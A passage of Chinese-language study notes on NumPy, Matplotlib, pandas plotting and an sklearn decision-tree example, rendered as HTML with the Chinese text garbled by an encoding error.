href="#%E9%87%8D%E5%91%BD%E5%90%8D">é‡å‘½å</a></li><li><a href="#%E5%A1%AB%E5%85%85">å¡«å……</a></li><li><a href="#%E6%9F%A5%E8%AF%A2">æŸ¥è¯¢</a></li><li><a href="#%E9%80%89%E6%8B%A9%E7%B1%BB%E5%9E%8B">é€‰æ‹©ç±»å‹</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E5%B1%95%E5%BC%80">æ•°æ®å±•å¼€</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E7%B4%AF%E5%8A%A0">æ•°æ®ç´¯åŠ </a></li><li><a href="#%E5%88%97%E6%93%8D%E4%BD%9C">åˆ—æ“ä½œ</a></li><li><a href="#%E8%A1%8C%E6%93%8D%E4%BD%9C">è¡Œæ“ä½œ</a></li><li><a href="#pivot%E4%B8%8Egroupby">pivotä¸groupby</a></li><li><a href="#unstack">unstack</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E8%81%9A%E5%90%88">æ•°æ®èšåˆ</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E6%9F%A5%E8%AF%A2">æ•°æ®æŸ¥è¯¢</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E6%B1%87%E6%80%BB">æ•°æ®æ±‡æ€»</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E5%90%88%E5%B9%B6">æ•°æ®åˆå¹¶</a></li><li><a href="#%E5%A4%9A%E4%B8%AAdf%E7%94%BB%E4%B8%80%E8%B5%B7">å¤šä¸ªDFç”»ä¸€èµ·</a></li><li><a href="#%E5%88%86%E6%9E%90%E5%92%8C%E6%8E%92%E5%BA%8F">åˆ†æå’Œæ’åº</a></li><li><a href="#%E5%8F%8C%E7%BA%B5%E5%9D%90%E6%A0%87%E8%BD%B4">åŒçºµåæ ‡è½´</a></li><li><a href="#%E6%9E%84%E5%BB%BA%E7%A9%BAdf">æ„å»ºç©ºDF</a></li><li><a href="#%E6%9B%B4%E6%94%B9%E6%97%A5%E6%9C%9F%E9%97%B4%E9%9A%94">æ›´æ”¹æ—¥æœŸé—´éš”</a></li><li><a href="#%E6%9F%A5%E7%9C%8B%E7%BB%9F%E8%AE%A1%E6%95%B0%E6%8D%AE">æŸ¥çœ‹ç»Ÿè®¡æ•°æ®</a></li><li><a href="#%E4%BF%9D%E5%AD%98%E6%96%87%E4%BB%B6">ä¿å­˜æ–‡ä»¶</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E9%A2%84%E5%A4%84%E7%90%86-1">æ•°æ®é¢„å¤„ç†</a></li><li><a href="#%E5%88%A0%E9%99%A4%E7%A9%BA%E8%A1%8C">åˆ é™¤ç©ºè¡Œ</a></li><li><a href="#%E6%9B%BF%E6%8D%A2">æ›¿æ¢</a></li></ul></li><li><a href="#%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93">ç®—æ³•æ€»ç»“</a><ul><li><a href="#%E5%86%B3%E7%AD%96%E6%A0%91-1">å†³ç­–æ ‘</a></li></ul></li></ul><!-- tocstop --><h3><span id="é™ç»´">é™ç»´</span></h3><ul><li>ravel()ï¼šå¦‚æœæ²¡æœ‰å¿…è¦ï¼Œä¸ä¼šäº§ç”Ÿæºæ•°æ®çš„å‰¯æœ¬ </li><li>flatten()ï¼šè¿”å›æºæ•°æ®çš„å‰¯æœ¬ </li><li>squeeze()ï¼šåªèƒ½å¯¹ç»´æ•°ä¸º1çš„ç»´åº¦é™ç»´</li><li>logspace ç”¨äºåˆ›å»ºç­‰æ¯”æ•°åˆ—</li></ul><p>å‡å¦‚ï¼Œæˆ‘ä»¬æƒ³è¦æ”¹å˜åŸºæ•°ï¼Œä¸è®©å®ƒä»¥10ä¸ºåº•æ•°ï¼Œæˆ‘ä»¬å¯ä»¥æ”¹å˜baseå‚æ•°ï¼Œå°†å…¶è®¾ç½®ä¸º2è¯•è¯•ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = np.logspace(<span class="number">0</span>,<span class="number">9</span>,<span class="number">10</span>,base=<span class="number">2</span>)</span><br><span class="line">a</span><br><span class="line">array([   <span class="number">1.</span>,    <span class="number">2.</span>,    <span class="number">4.</span>,    <span class="number">8.</span>,   <span class="number">16.</span>,   <span class="number">32.</span>,   <span class="number">64.</span>,  <span class="number">128.</span>,  <span class="number">256.</span>,  <span class="number">512.</span>])</span><br></pre></td></tr></table></figure><h3><span id="npset_printoptions">np.set_printoptions</span></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">np.set_printoptions(precision=None, threshold=None, edgeitems=None, linewidth=None, suppress=None, nanstr=None, infstr=None)</span><br></pre></td></tr></table></figure><p><strong>precision :</strong></p><p>ã€€ã€€int, optionalï¼Œfloatè¾“å‡ºçš„ç²¾åº¦ï¼Œå³å°æ•°ç‚¹åç»´æ•°ï¼Œé»˜è®¤8ï¼ˆ Number of digits of precision for floating point output (default 8)ï¼‰</p><p><strong>threshold :</strong></p><p>ã€€ã€€int, optionalï¼Œå½“æ•°ç»„æ•°ç›®è¿‡å¤§æ—¶ï¼Œè®¾ç½®æ˜¾ç¤ºå‡ ä¸ªæ•°å­—ï¼Œå…¶ä½™ç”¨çœç•¥å·ï¼ˆTotal number of array elements which trigger summarization rather than full repr (default 1000).ï¼‰</p><p><strong>edgeitems :</strong></p><p>ã€€ã€€ int, optionalï¼Œè¾¹ç¼˜æ•°ç›®ï¼ˆNumber of array items in summary at beginning and end of each dimension (default 3)ï¼‰.</p><p><strong>linewidth :</strong></p><p>ã€€ã€€ int, optionalï¼Œçº¿æ¡å®½åº¦ The number of characters per line for the purpose of inserting line breaks (default 75).</p><p><strong>suppress :</strong></p><p>ã€€ã€€ bool, optionalï¼Œæ˜¯å¦å‹ç¼©ç”±ç§‘å­¦è®¡æ•°æ³•è¡¨ç¤ºçš„æµ®ç‚¹æ•°ï¼ˆWhether or not suppress printing of small floating point values using scientific notation (default False).ï¼‰</p><p><strong>nanstr :</strong></p><p>ã€€ã€€ str, optionalï¼ŒString representation of floating point not-a-number (default nan).</p><p><strong>infstr :</strong></p><p>ã€€ã€€str, optionalï¼ŒString representation of floating point infinity (default inf).</p><h3><span id="bicount">bicount</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ‰¾åˆ°ä¸€ä¸ªæ•°ç»„ä¸­æœ€å¸¸å‡ºç°çš„æ•°å­—</span></span><br><span class="line">z = np.random.randint(<span class="number">0</span>,<span class="number">10</span>,<span class="number">50</span>)</span><br><span class="line">np.set_printoptions(threshold=<span class="number">1000</span>)</span><br><span class="line"><span class="built_in">print</span>(z)</span><br><span class="line"><span class="built_in">print</span>(np.bincount(z))</span><br><span class="line"><span class="built_in">print</span>(np.argmax(np.bincount(z)))</span><br><span class="line"></span><br><span class="line">[<span class="number">9</span> <span class="number">8</span> <span class="number">0</span> <span class="number">6</span> <span class="number">4</span> <span class="number">8</span> <span class="number">5</span> <span class="number">9</span> <span class="number">7</span> <span class="number">1</span> <span class="number">4</span> <span class="number">0</span> <span class="number">2</span> <span class="number">5</span> <span class="number">7</span> <span class="number">7</span> <span class="number">3</span> <span class="number">8</span> <span class="number">0</span> <span class="number">6</span> <span class="number">4</span> <span class="number">6</span> <span class="number">2</span> <span class="number">5</span> <span class="number">4</span> <span class="number">7</span> <span class="number">6</span> <span class="number">6</span> <span class="number">7</span> <span class="number">0</span> <span class="number">9</span> <span class="number">4</span> <span class="number">5</span> <span class="number">1</span> <span class="number">9</span> <span class="number">6</span> <span class="number">7</span> <span class="number">3</span> <span class="number">7</span> <span class="number">8</span> <span class="number">2</span> <span class="number">1</span> <span class="number">9</span> <span class="number">5</span> <span class="number">0</span> <span class="number">7</span> <span class="number">8</span> <span class="number">5</span> <span class="number">8</span> <span class="number">3</span>]</span><br><span class="line">[<span class="number">5</span> <span class="number">3</span> <span class="number">3</span> <span class="number">3</span> <span class="number">5</span> <span class="number">6</span> <span class="number">6</span> <span class="number">8</span> <span class="number">6</span> <span class="number">5</span>]</span><br><span class="line"><span class="number">7</span></span><br></pre></td></tr></table></figure><p>å…¶å®bicountå°†ç»“æœæ˜ å°„æˆä¸€ä¸ªlistï¼Œåˆ†åˆ«ä»£è¡¨0å‡ºç°çš„æ¬¡æ•°ï¼Œ1å‡ºç°çš„æ¬¡æ•°ã€‚ã€‚ã€‚</p><p>æ‰¾åˆ°å‡ºç°æœ€å¤šæ¬¡æ•°çš„ä¸‹æ ‡å°±æ˜¯æ‰¾åˆ°ä¸€ä¸ªæ•°ç»„ä¸­æœ€å¸¸å‡ºç°çš„æ•°å­—</p><h3><span id="lexsort">lexsort</span></h3><p>numpy.lexsort() ç”¨äºå¯¹å¤šä¸ªåºåˆ—è¿›è¡Œæ’åºã€‚æŠŠå®ƒæƒ³è±¡æˆå¯¹ç”µå­è¡¨æ ¼è¿›è¡Œæ’åºï¼Œæ¯ä¸€åˆ—ä»£è¡¨ä¸€ä¸ªåºåˆ—ï¼Œ<strong>æ’åºæ—¶ä¼˜å…ˆç…§é¡¾é åçš„åˆ—</strong>ã€‚</p><p>è¿™é‡Œä¸¾ä¸€ä¸ªåº”ç”¨åœºæ™¯ï¼šå°å‡åˆè€ƒè¯•ï¼Œé‡ç‚¹ç­å½•å–å­¦ç”ŸæŒ‰ç…§æ€»æˆç»©å½•å–ã€‚åœ¨æ€»æˆç»©ç›¸åŒæ—¶ï¼Œæ•°å­¦æˆç»©é«˜çš„ä¼˜å…ˆå½•å–ï¼Œåœ¨æ€»æˆç»©å’Œæ•°å­¦æˆç»©éƒ½ç›¸åŒæ—¶ï¼ŒæŒ‰ç…§è‹±è¯­æˆç»©å½•å–â€¦â€¦ è¿™é‡Œï¼Œæ€»æˆç»©æ’åœ¨ç”µå­è¡¨æ ¼çš„æœ€åä¸€åˆ—ï¼Œæ•°å­¦æˆç»©åœ¨å€’æ•°ç¬¬äºŒåˆ—ï¼Œè‹±è¯­æˆç»©åœ¨å€’æ•°ç¬¬ä¸‰åˆ—ã€‚</p><h3><span id="ç»ƒä¹ é¢˜">ç»ƒä¹ é¢˜</span></h3><h2><span id="trick">Trick</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">np.add? <span class="comment"># æ˜¾ç¤ºå¸®åŠ©</span></span><br><span class="line">np.add?? <span class="comment"># æ˜¾ç¤ºæºä»£ç </span></span><br><span class="line"><span class="comment"># fstingç”¨æ³• python&gt;=3.6</span></span><br><span class="line">number = <span class="number">7</span></span><br><span class="line"><span class="string">f&#x27;My lucky number is <span class="subst">&#123;number&#125;</span>&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2><span id="matplotlib">Matplotlib</span></h2><ul><li><code>%matplotlib inline</code>: è¿™ä¸€å¥æ˜¯IPythonçš„é­”æ³•å‡½æ•°ï¼Œå¯ä»¥åœ¨IPythonç¼–è¯‘å™¨é‡Œç›´æ¥ä½¿ç”¨ï¼Œä½œç”¨æ˜¯å†…åµŒç”»å›¾ï¼Œçœç•¥æ‰plt.show()è¿™ä¸€æ­¥ï¼Œç›´æ¥æ˜¾ç¤ºå›¾åƒã€‚</li></ul><h3><span id="åŸºæœ¬æ“ä½œ">åŸºæœ¬æ“ä½œ</span></h3><ul><li><p>ç”»å›¾</p><p><code>plt.plot(x,y)</code></p></li><li><p>æ ‡ç­¾</p><p><code>plt.xlabel(&#39;xlabel&#39;,fontsize = 16)</code></p></li><li><p>çº¿æ¡&amp;é¢œè‰²</p><table><thead><tr><th align="right">å­—ç¬¦</th><th align="right">ç±»å‹</th><th align="right">å­—ç¬¦</th><th align="right">ç±»å‹</th></tr></thead><tbody><tr><td align="right"><code>&#39;-&#39;</code></td><td align="right">å®çº¿</td><td align="right"><code>&#39;--&#39;</code></td><td align="right">è™šçº¿</td></tr><tr><td align="right"><code>&#39;-.&#39;</code></td><td align="right">è™šç‚¹çº¿</td><td align="right"><code>&#39;:&#39;</code></td><td align="right">ç‚¹çº¿</td></tr><tr><td align="right"><code>&#39;.&#39;</code></td><td align="right">ç‚¹</td><td align="right"><code>&#39;,&#39;</code></td><td align="right">åƒç´ ç‚¹</td></tr><tr><td align="right"><code>&#39;o&#39;</code></td><td align="right">åœ†ç‚¹</td><td align="right"><code>&#39;v&#39;</code></td><td align="right">ä¸‹ä¸‰è§’ç‚¹</td></tr><tr><td align="right"><code>&#39;^&#39;</code></td><td align="right">ä¸Šä¸‰è§’ç‚¹</td><td align="right"><code>&#39;&lt;&#39;</code></td><td align="right">å·¦ä¸‰è§’ç‚¹</td></tr><tr><td align="right"><code>&#39;&gt;&#39;</code></td><td align="right">å³ä¸‰è§’ç‚¹</td><td align="right"><code>&#39;1&#39;</code></td><td align="right">ä¸‹ä¸‰å‰ç‚¹</td></tr><tr><td align="right"><code>&#39;2&#39;</code></td><td align="right">ä¸Šä¸‰å‰ç‚¹</td><td align="right"><code>&#39;3&#39;</code></td><td align="right">å·¦ä¸‰å‰ç‚¹</td></tr><tr><td align="right"><code>&#39;4&#39;</code></td><td align="right">å³ä¸‰å‰ç‚¹</td><td align="right"><code>&#39;s&#39;</code></td><td align="right">æ­£æ–¹ç‚¹</td></tr><tr><td align="right"><code>&#39;p&#39;</code></td><td align="right">äº”è§’ç‚¹</td><td align="right"><code>&#39;*&#39;</code></td><td align="right">æ˜Ÿå½¢ç‚¹</td></tr><tr><td align="right"><code>&#39;h&#39;</code></td><td align="right">å…­è¾¹å½¢ç‚¹1</td><td align="right"><code>&#39;H&#39;</code></td><td align="right">å…­è¾¹å½¢ç‚¹2</td></tr><tr><td align="right"><code>&#39;+&#39;</code></td><td align="right">åŠ å·ç‚¹</td><td align="right"><code>&#39;x&#39;</code></td><td align="right">ä¹˜å·ç‚¹</td></tr><tr><td align="right"><code>&#39;D&#39;</code></td><td align="right">å®å¿ƒè±å½¢ç‚¹</td><td align="right"><code>&#39;d&#39;</code></td><td align="right">ç˜¦è±å½¢ç‚¹</td></tr><tr><td align="right"><code>&#39;_&#39;</code></td><td align="right">æ¨ªçº¿ç‚¹</td><td align="right"></td><td align="right"></td></tr></tbody></table><table><thead><tr><th align="right">å­—ç¬¦</th><th align="right">é¢œè‰²</th></tr></thead><tbody><tr><td align="right"><code>â€˜bâ€™</code></td><td align="right">è“è‰²ï¼Œblue</td></tr><tr><td align="right"><code>â€˜gâ€™</code></td><td align="right">ç»¿è‰²ï¼Œgreen</td></tr><tr><td align="right"><code>â€˜râ€™</code></td><td align="right">çº¢è‰²ï¼Œred</td></tr><tr><td align="right"><code>â€˜câ€™</code></td><td align="right">é’è‰²ï¼Œcyan</td></tr><tr><td align="right"><code>â€˜mâ€™</code></td><td align="right">å“çº¢ï¼Œmagenta</td></tr><tr><td align="right"><code>â€˜yâ€™</code></td><td align="right">é»„è‰²ï¼Œyellow</td></tr><tr><td align="right"><code>â€˜kâ€™</code></td><td align="right">é»‘è‰²ï¼Œblack</td></tr><tr><td align="right"><code>â€˜wâ€™</code></td><td align="right">ç™½è‰²ï¼Œwhite</td></tr></tbody></table></li><li><p>çº¿æ¡é£æ ¼ï¼š</p><p><code>plt.plot([1,2,3,4,5],[1,4,9,16,25],&#39;-.&#39;,color=&#39;r&#39;)</code></p><p>æˆ–è€…å°†ä¸¤è€…ç»“åˆä½¿ç”¨</p><p><code>plt.plot([1,2,3,4,5],[1,4,9,16,25],&#39;ro&#39;)</code></p></li><li><p>çº¿å®½ linewidth</p><p><code>plt.plot(x,y,linewidth = 3.0)</code></p></li><li><p>å­å›¾</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 211 è¡¨ç¤ºä¸€ä¼šè¦ç”»çš„å›¾æ˜¯2è¡Œä¸€åˆ—çš„ æœ€åä¸€ä¸ª1è¡¨ç¤ºçš„æ˜¯å­å›¾å½“ä¸­çš„ç¬¬1ä¸ªå›¾</span></span><br><span class="line">plt.subplot(<span class="number">211</span>)</span><br><span class="line">plt.plot(x,y,color=<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 212 è¡¨ç¤ºä¸€ä¼šè¦ç”»çš„å›¾æ˜¯2è¡Œä¸€åˆ—çš„ æœ€åä¸€ä¸ª1è¡¨ç¤ºçš„æ˜¯å­å›¾å½“ä¸­çš„ç¬¬2ä¸ªå›¾</span></span><br><span class="line">plt.subplot(<span class="number">212</span>)</span><br><span class="line">plt.plot(x,y,color=<span class="string">&#x27;b&#x27;</span>)</span><br></pre></td></tr></table></figure></li><li><p>æ ‡é¢˜</p><p><code>plt.title(&#39;title&#39;)</code></p></li><li><p>æ–‡æœ¬</p><p><code>plt.text(x,y,&#39;text)</code></p><p>x,yä¸ºæ•°è½´ä¸Šçš„åæ ‡</p></li><li><p>ç½‘æ ¼</p><p><code>plt.grid(True)</code></p></li><li><p>æ³¨é‡Š</p><p><code>plt.annotate(&#39;tangyudi&#39;,xy=(-5,0),xytext=(-2,0.3),arrowprops = dict(facecolor=&#39;red&#39;,shrink=0.05,headlength= 20,headwidth = 20))</code></p></li></ul><h3><span id="é£æ ¼">é£æ ¼</span></h3><ul><li><p>æŸ¥çœ‹é£æ ¼ï¼š</p><p><code>plt.style.available</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;dark_background&#x27;,</span><br><span class="line"> &#x27;seaborn-talk&#x27;,</span><br><span class="line"> &#x27;seaborn-bright&#x27;,</span><br><span class="line"> &#x27;seaborn-ticks&#x27;,</span><br><span class="line"> &#x27;bmh&#x27;,</span><br><span class="line"> &#x27;ggplot&#x27;,</span><br><span class="line"> &#x27;seaborn-darkgrid&#x27;,</span><br><span class="line"> &#x27;classic&#x27;,</span><br><span class="line"> &#x27;fivethirtyeight&#x27;,</span><br><span class="line"> &#x27;seaborn-deep&#x27;,</span><br><span class="line"> &#x27;seaborn-colorblind&#x27;,</span><br><span class="line"> &#x27;seaborn-muted&#x27;,</span><br><span class="line"> &#x27;seaborn-pastel&#x27;,</span><br><span class="line"> &#x27;seaborn-notebook&#x27;,</span><br><span class="line"> &#x27;seaborn-paper&#x27;,</span><br><span class="line"> &#x27;seaborn-dark-palette&#x27;,</span><br><span class="line"> &#x27;seaborn-whitegrid&#x27;,</span><br><span class="line"> &#x27;seaborn-white&#x27;,</span><br><span class="line"> &#x27;grayscale&#x27;,</span><br><span class="line"> &#x27;seaborn-dark&#x27;,</span><br><span class="line"> &#x27;seaborn-poster&#x27;]</span><br></pre></td></tr></table></figure></li><li><p>ä½¿ç”¨é£æ ¼<br><code>plt.style.use(&#39;ggplot&#39;)</code></p><p>Parameters</p><ul><li><p>styleï¼šstr, dict, Path or list</p><p>A style specification. Valid options are:</p><ul><li><p>str: The name of a style or a path&#x2F;URL to a style file. For a list of available style names, see <a href="https://matplotlib.org/stable/api/style_api.html?highlight=style#matplotlib.style.matplotlib.style.available"><code>style.available</code></a>.</p></li><li><p>dict: Dictionary with valid key&#x2F;value pairs for <a href="https://matplotlib.org/stable/api/matplotlib_configuration_api.html#matplotlib.rcParams"><code>matplotlib.rcParams</code></a>.</p></li><li><p>Path: A path-like object which is a path to a style file.</p></li><li><p>list: A list of style specifiers (str, Path or dict) applied from first to last in the list.</p></li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">x = np.linspace(-<span class="number">10</span>,<span class="number">10</span>)</span><br><span class="line">y = np.sin(x)</span><br><span class="line">plt.style.use(<span class="string">&#x27;ggplot&#x27;</span>)</span><br><span class="line">plt.plot(x,y)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure></li></ul><h3><span id="é¢å‘å¯¹è±¡ç”»å›¾">é¢å‘å¯¹è±¡ç”»å›¾</span></h3><pre><code><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line">x = np.arange(<span class="number">0</span>, math.pi*<span class="number">2</span>, <span class="number">0.05</span>)</span><br><span class="line">y = np.sin(x)</span><br><span class="line"><span class="comment">#åˆ›å»ºå›¾å½¢å¯¹è±¡</span></span><br><span class="line">fig = plt.figure()</span><br><span class="line"><span class="comment">#æˆ‘ä»¬ä½¿ç”¨ add_axes() å°† axes è½´åŸŸæ·»åŠ åˆ°ç”»å¸ƒä¸­</span></span><br><span class="line"><span class="comment">#add_axes() çš„å‚æ•°å€¼æ˜¯ä¸€ä¸ªåºåˆ—ï¼Œåºåˆ—ä¸­çš„ 4 ä¸ªæ•°å­—åˆ†åˆ«å¯¹åº”å›¾å½¢çš„å·¦ä¾§å¼€å§‹ç”»å›¾ä½ç½®ï¼Œåº•éƒ¨å¼€å§‹ç”»å›¾ä½ç½®ï¼Œå®½åº¦ç¼©æ”¾ï¼Œå’Œé«˜åº¦ç¼©æ”¾ï¼Œä¸”æ¯ä¸ªæ•°å­—å¿…é¡»ä»‹äº 0 åˆ° 1 ä¹‹é—´ã€‚</span></span><br><span class="line">ax=fig.add_axes([<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>])</span><br><span class="line">ax.plot(x,y)</span><br><span class="line">ax.set_title(<span class="string">&quot;sine wave&quot;</span>)</span><br><span class="line">ax.set_xlabel(<span class="string">&#x27;angle&#x27;</span>)</span><br><span class="line">ax.set_ylabel(<span class="string">&#x27;sine&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure></code></pre><ul><li>å›¾ä¾‹</li></ul><p>axes ç±»çš„ legend() æ–¹æ³•è´Ÿè´£ç»˜åˆ¶ç”»å¸ƒä¸­çš„å›¾ä¾‹ï¼Œå®ƒéœ€è¦ä¸‰ä¸ªå‚æ•°ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><p>ax.legend(handles, labels, loc)</p><ul><li>labels æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²åºåˆ—ï¼Œç”¨æ¥æŒ‡å®šæ ‡ç­¾çš„åç§°ï¼›</li><li>loc æ˜¯æŒ‡å®šå›¾ä¾‹ä½ç½®çš„å‚æ•°ï¼Œå…¶å‚æ•°å€¼å¯ä»¥ç”¨å­—ç¬¦ä¸²æˆ–æ•´æ•°æ¥è¡¨ç¤ºï¼›</li><li>handles å‚æ•°ï¼Œå®ƒä¹Ÿæ˜¯ä¸€ä¸ªåºåˆ—ï¼Œå®ƒåŒ…å«äº†æ‰€æœ‰çº¿å‹çš„å®ä¾‹ï¼›</li></ul><p><a href="http://c.biancheng.net/matplotlib/">http://c.biancheng.net/matplotlib/</a></p><p><img src="https://pic3.zhimg.com/v2-cfe3dd3becbae38d3af4659b4ff1676a_r.jpg" alt="preview"></p><p><a href="https://zhuanlan.zhihu.com/p/139052035">https://zhuanlan.zhihu.com/p/139052035</a></p><p><img src="https://pic3.zhimg.com/80/v2-6e4429872eeb8a155433c0ee7c75b6ea_1440w.jpg" alt="img"></p><p><img src="https://pic2.zhimg.com/80/v2-124378df90b3ff1e24eb48c36af08dc9_1440w.jpg" alt="img"></p><p><a href="https://zhuanlan.zhihu.com/p/93423829">https://zhuanlan.zhihu.com/p/93423829</a></p><h2><span id="ç»“åˆpandasç”»å›¾">ç»“åˆpandasç”»å›¾</span></h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">df=pandas.<span class="title function_ invoke__">DataFrame</span>()</span><br><span class="line">å¸¸è§çš„ç”»å›¾æ–¹æ³•å¦‚ä¸‹ï¼š</span><br><span class="line">df.<span class="title function_ invoke__">plot</span>()</span><br><span class="line">ä¹Ÿå¯ä»¥ä¼ å…¥å‚æ•°ï¼šdf.<span class="title function_ invoke__">plot</span>(kind=value)å†³å®šç”»ä»€ä¹ˆç±»å‹çš„å›¾</span><br><span class="line">kind=line    ç”»æŠ˜çº¿å›¾</span><br><span class="line">kind=bar     xè½´ç”»çŸ©å½¢å›¾</span><br><span class="line">kind=barh    yè½´ç”»çŸ©å½¢å›¾</span><br><span class="line">kind=pie     ç”»é¥¼å›¾</span><br><span class="line">kind=scatter ç”»æ•£ç‚¹</span><br><span class="line">kind=<span class="keyword">box</span>     ç”»ç›’å­å›¾</span><br><span class="line">kind=kde     ç”»æ ¸å¯†åº¦ä¼°è®¡å›¾</span><br><span class="line"></span><br><span class="line">æˆ–è€…:</span><br><span class="line">df.plot.<span class="title function_ invoke__">line</span>()</span><br><span class="line">df.plot.<span class="title function_ invoke__">bar</span>()</span><br><span class="line">df.plot.<span class="title function_ invoke__">barh</span>()</span><br><span class="line">df.plot.<span class="title function_ invoke__">pie</span>()</span><br><span class="line">df.plot.<span class="title function_ invoke__">scatter</span>()</span><br><span class="line">df.plot.<span class="title function_ invoke__">box</span>()</span><br><span class="line">df.plot.<span class="title function_ invoke__">kde</span>()</span><br></pre></td></tr></table></figure><h2><span id="sklearn">sklearn</span></h2><h3><span id="å†³ç­–æ ‘">å†³ç­–æ ‘</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> tree</span><br><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> load_wine</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"><span class="keyword">import</span> graphviz</span><br><span class="line"><span class="comment"># pandasæ‹¼æ¥æ•°æ®</span></span><br><span class="line">df = pd.concat([pd.DataFrame(wine.data), pd.DataFrame(wine.target)],axis=<span class="number">1</span>)</span><br><span class="line"><span class="comment"># åˆ’åˆ†è®­ç»ƒé›†å’Œæµ‹è¯•é›†</span></span><br><span class="line">Xtrain, Xtest, Ytrain, Ytest = train_test_split(wine.data, wine.target, test_size=<span class="number">0.3</span>)</span><br><span class="line"><span class="comment"># å®ä¾‹åŒ–ä¸€ä¸ªåˆ†ç±»å™¨</span></span><br><span class="line">clf = tree.DecisionTreeClassifier(criterion=<span class="string">&#x27;entropy&#x27;</span>,random_state=<span class="number">3</span>,splitter=<span 